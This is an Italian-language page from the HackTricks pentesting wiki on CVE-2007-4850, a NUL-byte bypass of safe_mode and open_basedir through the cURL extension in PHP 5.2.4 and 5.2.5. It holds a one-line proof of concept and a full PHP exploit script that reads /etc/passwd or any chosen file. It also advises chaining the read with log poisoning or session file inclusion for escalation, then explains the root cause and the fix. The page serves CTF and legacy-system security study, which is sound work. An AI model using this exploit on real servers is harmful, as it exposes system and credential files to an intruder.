# PHP 5.2.4 e 5.2.5 PHP cURL

{{#include ../../../../banners/hacktricks-training.md}}

Questa pagina documenta un trucco legacy ma ancora utile in CTFs/installazioni legacy locali per bypassare i controlli PHP safe_mode/open_basedir usando l'estensione cURL su build specifiche di PHP 5.2.x.

- Interessati: PHP 5.2.4 e 5.2.5 con ext/curl abilitata.
- Impatto: Lettura di file locali arbitrari nonostante le restrizioni di safe_mode o open_basedir (nessuna esecuzione diretta di codice).
- ID: CVE-2007-4850.

Da http://blog.safebuff.com/2016/05/06/disable-functions-bypass/

## PoC monoriga

Se safe_mode o open_basedir sono attivi e cURL è abilitato, quanto segue restituirà il contenuto dello script corrente:
```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```
## PoC più esplicito (arbitrary file read)
```php
<?php
// Preconditions (legacy): PHP 5.2.4/5.2.5, safe_mode or open_basedir enabled, ext/curl loaded
$target = '/etc/passwd'; // change to the file you want to read
$ch = curl_init();
// The trick is the NUL byte (\x00). Prefix can be any string; checks are confused and the file after the NUL is read.
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);
if ($resp !== false) {
echo $resp; // should contain the target file
} else {
echo "cURL error: $err\n";
}
?>
```
Note:
- Usa le virgolette doppie o chr(0) per iniettare un vero byte NUL. Percent-encoding (%00) non funzionerà in modo affidabile.
- Questa è una primitiva per la lettura di file. Combinala con altre primitive (log poisoning, session file inclusion, etc.) per escalation successive quando possibile.

## Perché funziona (breve)

La vulnerabilità risiede in come PHP 5.2.4/5.2.5 eseguiva i controlli safe_mode/open_basedir per gli URL file:// in ext/curl. Il controllo analizzava l'URL e validava una componente di percorso, ma a causa della gestione dei byte NUL validava una stringa diversa rispetto a quella effettivamente usata da libcurl. In pratica, il validatore poteva approvare il percorso dopo il NUL mentre libcurl usava la parte prima del NUL come contenitore dell'URL, permettendo un bypass che porta alla lettura del file posizionato dopo il byte NUL. Vedi l'analisi originale e la macro interessata in curl/interface.c per dettagli. [CVE-2007-4850].

## Vincoli e correzioni

- Corretto nelle successive 5.2.x (es. build delle distribuzioni patchate a 5.2.6) correggendo il parsing/la validazione in ext/curl.
- Colpisce solo deployment PHP molto vecchi; safe_mode è stato rimosso in PHP 5.4 e le build moderne non mostrano questo comportamento.

## Vedi anche

Altri bypass per disable_functions/open_basedir e tecniche moderne sono raccolti qui:

{{#ref}}
README.md
{{#endref}}



## Riferimenti

- Voce CVE di Ubuntu con patch e versioni interessate: https://ubuntu.com/security/CVE-2007-4850
- Analisi tecnica con contesto di codice (cxsecurity): http://cxsecurity.com/issue/WLB-2008010060
{{#include ../../../../banners/hacktricks-training.md}}
